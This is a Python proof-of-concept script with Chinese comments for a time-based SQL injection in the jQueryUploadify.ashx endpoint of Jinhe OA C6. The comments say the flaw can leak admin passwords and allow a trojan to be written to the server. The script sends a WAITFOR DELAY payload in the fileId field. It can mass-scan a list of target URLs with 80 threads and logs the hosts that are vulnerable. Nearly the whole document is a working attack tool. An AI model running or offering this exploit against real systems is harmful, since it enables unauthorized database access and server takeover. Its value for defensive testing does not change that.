# 金和OA C6 jQueryUploadify.ashx SQL注入漏洞 
# app="金和网络-金和OA"
# 产品简介:金和OA协同办公管理系统软件（简称金和OA），本着简单、适用、高效的原则，贴合企事业单位的实际需求，实行通用化、标准化、智能化、人性化的产品设计，充分体现企事业单位规范管理、提高办公效率的核心思想，为用户提供一整套标准的办公自动化解决方案，以帮助企事业单位迅速建立便捷规范的办公环境。
# 漏洞概述:金和OA C6 jQueryUploadify.ashx 接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
# POST/SQL延时注入

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """
                    \x1b[38m     ██╗██╗  ██╗       ██████╗  █████╗ 
                    \x1b[36m     ██║██║  ██║      ██╔═══██╗██╔══██╗
                    \x1b[34m     ██║███████║█████╗██║   ██║███████║
                    \x1b[35m██   ██║██╔══██║╚════╝██║   ██║██╔══██║
                    \x1b[31m╚█████╔╝██║  ██║      ╚██████╔╝██║  ██║
                    \x1b[33m ╚════╝ ╚═╝  ╚═╝       ╚═════╝ ╚═╝  ╚═╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
        --author:Kucei  --Vession:金和OA C6 jQueryUploadify.ashx SQL注入漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("金和OA_C6_jQueryUploadify.ashx_SQL")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    url_payload = "/C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data1 = "type=delete&fileId=-99"
    data2 = "type=delete&fileId=-99';WAITFOR+DELAY'0:0:5'--"
    try :
        response1 = requests.post(url=target+url_payload,headers=headers,data=data1,verify=False,timeout=5)
        response2 = requests.post(url=target+url_payload,headers=headers,data=data2,verify=False,timeout=7)
        # print(response.status_code)
        # print(response.text)
        time1 = response1.elapsed.total_seconds()
        time2 = response2.elapsed.total_seconds()
        if response1.status_code == 200 and time2 - time1 >= 4.5:
            print( f"[+] {target} 存在漏洞")
            with open('金和OA_C6_jQueryUploadify.ashx_SQL.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在漏洞")
    except :
        print(target+"--站点连接异常--")
if __name__ == '__main__':
    main()